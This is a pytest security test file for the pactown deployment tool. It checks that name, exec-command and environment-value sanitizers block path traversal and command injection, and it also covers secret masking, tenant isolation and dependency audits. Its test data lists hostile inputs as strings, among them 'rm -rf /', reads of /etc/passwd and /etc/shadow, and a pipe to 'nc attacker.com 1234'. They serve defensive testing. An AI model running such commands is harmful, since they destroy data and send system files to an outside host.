"""Security tests for pactown.

Tests cover:
- Input sanitization
- Path traversal prevention
- Command injection prevention
- Secrets leakage prevention
- Rate limiting validation
"""

import os
import re
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest


class TestInputSanitization:
    """Test input sanitization functions."""

    def test_service_name_rejects_path_traversal(self):
        """Service names must not allow path traversal."""
        from pactown.deploy.quadlet import sanitize_name

        dangerous_names = [
            "../etc/passwd",
            "..\\windows\\system32",
            "foo/../bar",
            "/absolute/path",
            "name\x00null",
            "name`id`",
            "name$(whoami)",
            "name;rm -rf /",
        ]

        for name in dangerous_names:
            sanitized = sanitize_name(name)
            assert ".." not in sanitized, f"Path traversal not blocked: {name}"
            assert "/" not in sanitized, f"Slash not removed: {name}"
            assert "\\" not in sanitized, f"Backslash not removed: {name}"
            assert "\x00" not in sanitized, f"Null byte not removed: {name}"
            assert "`" not in sanitized, f"Backtick not removed: {name}"
            assert "$(" not in sanitized, f"Command substitution not removed: {name}"
            assert ";" not in sanitized, f"Semicolon not removed: {name}"

    def test_tenant_id_sanitization(self):
        """Tenant IDs must be safe for filesystem and systemd."""
        from pactown.deploy.quadlet import sanitize_name

        # Valid tenant IDs should pass through (lowercase, alphanumeric, dash)
        valid = ["user123", "my-tenant", "prod-api-1"]
        for tid in valid:
            assert sanitize_name(tid) == tid.lower().replace("_", "-")

        # Invalid characters should be removed/replaced
        invalid = ["user@domain", "tenant:admin", "user\nname"]
        for tid in invalid:
            sanitized = sanitize_name(tid)
            assert "@" not in sanitized
            assert ":" not in sanitized
            assert "\n" not in sanitized


class TestPathTraversal:
    """Test path traversal prevention."""

    def test_sandbox_path_stays_within_root(self):
        """Sandbox operations must stay within designated root."""
        from pactown.runner import Sandbox

        with tempfile.TemporaryDirectory() as tmpdir:
            sandbox = Sandbox(root=Path(tmpdir))

            # These should be blocked or normalized
            dangerous_paths = [
                "../../../etc/passwd",
                "/etc/passwd",
                "foo/../../bar",
                "~/.ssh/id_rsa",
            ]

            for dangerous in dangerous_paths:
                try:
                    result = sandbox.resolve_path(dangerous)
                    # If it resolves, it must be within sandbox
                    assert str(result).startswith(tmpdir), f"Path escaped sandbox: {dangerous} -> {result}"
                except (ValueError, PermissionError):
                    pass  # Blocking is acceptable


class TestCommandInjection:
    """Test command injection prevention."""

    def test_quadlet_exec_sanitization(self):
        """Exec commands in quadlet must be properly escaped."""
        from pactown.deploy.quadlet import QuadletGenerator

        gen = QuadletGenerator()

        # Dangerous payloads that might escape to shell
        payloads = [
            "python app.py; rm -rf /",
            "python app.py && cat /etc/passwd",
            "python app.py | nc attacker.com 1234",
            'python app.py $(cat /etc/shadow)',
            "python app.py `id`",
        ]

        for payload in payloads:
            # The generator should either reject or properly quote
            try:
                result = gen._format_exec_command(payload)
                # If it produces output, dangerous chars should be escaped
                assert "rm -rf" not in result or "'" in result or '"' in result
            except ValueError:
                pass  # Rejection is acceptable

    def test_env_value_injection(self):
        """Environment variable values must not allow command injection."""
        from pactown.deploy.quadlet import QuadletGenerator

        gen = QuadletGenerator()

        dangerous_values = [
            "value\nNEW_VAR=malicious",
            "value; export SECRET=stolen",
            "$(cat /etc/passwd)",
            "`id`",
        ]

        for val in dangerous_values:
            sanitized = gen._sanitize_env_value(val)
            assert "\n" not in sanitized, f"Newline injection: {val}"
            assert not sanitized.startswith("$("), f"Command subst not blocked: {val}"


class TestSecretsLeakage:
    """Test that secrets are not leaked."""

    def test_config_does_not_log_secrets(self):
        """Configuration repr/str must not expose secrets."""
        from pactown.config import ServiceConfig

        config = ServiceConfig(
            name="test",
            port=8000,
            env={"API_KEY": "secret123", "DATABASE_URL": "postgres://user:pass@host/db"},
        )

        str_repr = str(config)
        repr_repr = repr(config)

        # Secrets should be masked
        assert "secret123" not in str_repr
        assert "secret123" not in repr_repr
        assert "pass@" not in str_repr or "***" in str_repr

    def test_error_messages_do_not_leak_secrets(self):
        """Error messages must not contain sensitive data."""
        sensitive_patterns = [
            r"password\s*=\s*['\"]?[^'\"\s]+",
            r"api_key\s*=\s*['\"]?[^'\"\s]+",
            r"secret\s*=\s*['\"]?[^'\"\s]+",
            r"token\s*=\s*['\"]?[^'\"\s]+",
        ]

        # This is a meta-test: scan our own source for accidental logging
        src_dir = Path(__file__).parent.parent / "src" / "pactown"
        if not src_dir.exists():
            pytest.skip("Source directory not found")

        for py_file in src_dir.rglob("*.py"):
            content = py_file.read_text()
            for pattern in sensitive_patterns:
                matches = re.findall(rf"(log|print|raise).*{pattern}", content, re.IGNORECASE)
                assert not matches, f"Potential secret leak in {py_file}: {matches[:3]}"


class TestNetworkSecurity:
    """Test network-related security."""

    def test_port_allocation_bounds(self):
        """Port allocation must stay within safe range."""
        from pactown.network import PortAllocator

        allocator = PortAllocator(range_start=10000, range_end=20000)

        # Should not allow privileged ports
        with pytest.raises((ValueError, PermissionError)):
            allocator.allocate(preferred=80)

        with pytest.raises((ValueError, PermissionError)):
            allocator.allocate(preferred=443)

        # Should allocate within range
        port = allocator.allocate()
        assert 10000 <= port <= 20000

    def test_service_url_validation(self):
        """Service URLs must be validated."""
        from pactown.network import ServiceEndpoint

        # Valid URLs
        valid = ServiceEndpoint(host="localhost", port=8000)
        assert valid.url.startswith("http")

        # Host must not contain path traversal
        with pytest.raises(ValueError):
            ServiceEndpoint(host="localhost/../etc", port=8000)


class TestAuthorizationChecks:
    """Test authorization and access control."""

    def test_runner_requires_valid_tenant(self):
        """Runner operations require valid tenant context."""
        from pactown.runner import ServiceRunner

        # Empty or None tenant should be rejected
        with pytest.raises((ValueError, TypeError)):
            ServiceRunner(tenant_id=None)

        with pytest.raises((ValueError, TypeError)):
            ServiceRunner(tenant_id="")

    def test_cross_tenant_access_blocked(self):
        """One tenant cannot access another's resources."""
        from pactown.runner import ServiceRunner

        runner_a = ServiceRunner(tenant_id="tenant-a")
        runner_b = ServiceRunner(tenant_id="tenant-b")

        # Create a service for tenant A
        with patch.object(runner_a, "_run_process"):
            runner_a.run("service-1", "echo test")

        # Tenant B should not see tenant A's service
        status_b = runner_b.get_status("service-1")
        assert status_b is None or status_b.get("tenant_id") != "tenant-a"


class TestRateLimiting:
    """Test rate limiting mechanisms."""

    def test_runner_has_concurrency_limit(self):
        """Runner should enforce concurrency limits."""
        from pactown.runner import ServiceRunner

        runner = ServiceRunner(tenant_id="test", max_services=2)

        # Check that limit is enforced
        assert runner.max_services == 2

    def test_api_rate_limit_headers(self):
        """API responses should include rate limit headers."""
        # This would be an integration test with actual API
        # For unit test, verify the middleware is configured
        try:
            from pactown.runner_api import app

            # Check if rate limiting middleware is present
            middleware_names = [m.__class__.__name__ for m in getattr(app, "middleware", [])]
            # This is informational - rate limiting may be configured differently
        except ImportError:
            pytest.skip("runner_api not available")


class TestCryptography:
    """Test cryptographic practices."""

    def test_no_weak_random(self):
        """Code should not use weak random for security."""
        src_dir = Path(__file__).parent.parent / "src" / "pactown"
        if not src_dir.exists():
            pytest.skip("Source directory not found")

        weak_patterns = [
            r"random\.random\(",
            r"random\.randint\(",
            r"random\.choice\(",
        ]

        security_contexts = ["token", "secret", "key", "password", "auth", "session"]

        for py_file in src_dir.rglob("*.py"):
            content = py_file.read_text()
            for pattern in weak_patterns:
                for context in security_contexts:
                    # Check if weak random is used near security context
                    if re.search(rf"{context}.*{pattern}", content, re.IGNORECASE):
                        pytest.fail(f"Weak random used in security context in {py_file}")


def _pip_audit_available() -> bool:
    """Check if pip-audit is available."""
    try:
        result = subprocess.run(["pip-audit", "--version"], capture_output=True)
        return result.returncode == 0
    except FileNotFoundError:
        return False


class TestDependencySecurity:
    """Test for known vulnerable dependencies."""

    @pytest.mark.skipif(
        not _pip_audit_available(),
        reason="pip-audit not installed",
    )
    def test_no_known_vulnerabilities(self):
        """Dependencies should not have known vulnerabilities."""
        result = subprocess.run(
            ["pip-audit", "--strict", "--progress-spinner=off"],
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            pytest.fail(f"Vulnerable dependencies found:\n{result.stdout}\n{result.stderr}")
